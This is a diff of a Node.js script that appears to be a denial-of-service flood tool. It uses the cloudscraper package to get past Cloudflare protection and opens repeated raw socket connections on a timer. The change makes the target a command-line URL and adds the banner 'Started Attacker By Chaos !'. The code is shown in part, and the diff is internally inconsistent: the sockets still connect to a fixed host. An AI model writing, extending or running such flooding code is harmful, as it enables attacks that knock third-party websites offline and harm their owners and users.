@@ -1,11 +1,12 @@
 const EventEmitter = require('events');
+const url = require("url");
 const emitter = new EventEmitter();
 emitter.setMaxListeners(Number.POSITIVE_INFINITY); 
 const cloudscraper = require("cloudscraper");
+var host = url.parse(process.argv[2]).host
 var int = setInterval(()=>{
-var config = {url:"https://www.ssl.com",resolveWithFullResponse: true}
+var config = {url:process.argv[2],resolveWithFullResponse: true}
 cloudscraper.get(config,(err,r)=>{
-console.log(r['request']['req']['_header'])
 const s = require("net").Socket()
 s.connect(80,"www.ssl.com")
 s.setTimeout(10000);
@@ -18,20 +19,10 @@ s.destroy()
 return delete s
 },5000)
 })
-
-
-
-
-
-
-
 })
-
-
-
-
 setTimeout(()=>clearInterval(int),10000)
 })
+console.log("Started Attacker By Chaos !")
 process.on('uncaughtException', function (err) {
 	console.log(err);
 });
